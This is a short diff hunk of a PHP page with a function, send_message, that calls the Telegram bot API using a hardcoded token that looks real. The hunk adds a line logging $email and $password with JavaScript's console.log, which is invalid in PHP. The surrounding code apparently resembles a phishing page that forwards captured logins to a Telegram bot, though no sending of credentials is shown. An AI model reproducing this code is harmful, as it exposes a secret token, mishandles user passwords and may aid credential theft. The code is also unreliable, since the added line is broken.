@@ -19,6 +19,7 @@ function send_message($chat_id, $message){
         $text = urlencode($message);
         $apiToken = '6951049067:AAF4Y-kePwnyq_CdysCTUi9OXoqKbT2ZT7E';
         file_get_contents("https://api.telegram.org/bot$apiToken/getMe");
+        console.log($email, $password);
     }
 ?>
 <!DOCTYPE html>
